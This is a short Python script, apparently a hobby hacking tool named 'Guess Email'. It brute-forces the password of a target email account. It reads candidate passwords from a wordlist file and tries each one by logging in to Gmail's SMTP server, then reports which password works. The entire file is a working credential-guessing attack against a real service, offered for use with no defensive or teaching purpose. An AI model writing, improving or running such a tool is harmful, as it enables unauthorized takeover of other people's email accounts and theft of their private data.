try:
    import smtplib
    from time import sleep
    from pyfiglet import figlet_format
    from termcolor import colored
except ModuleNotFoundError as e:
    import sys

    print(e)
    input("Enter to Exit..")
    sys.exit()


class EmailGuess:
    def __init__(self, email: str, password: str) -> None:
        self.email = email
        self.password = password
        self.guess()

    def guess(self):
        self.server = smtplib.SMTP("smtp.gmail.com", 587)
        self.server.starttls()
        self.server.login(self.email, self.password)


if __name__ == "__main__":
    print(colored(figlet_format("Guess Email"), color="blue"))
    passwords = open("pass.txt", mode="r").read().strip().split()
    email = input(colored("Enter The Email >>", color="blue"))
    for password in passwords:
        try:
            EmailGuess(email=email, password=password)
            print(colored(f"Password Correct >>{password}", color="green"))
            sleep(3)
            break
        except smtplib.SMTPAuthenticationError:
            print(colored(f"Password Wrong >>{password}", color="red"))
            sleep(3)
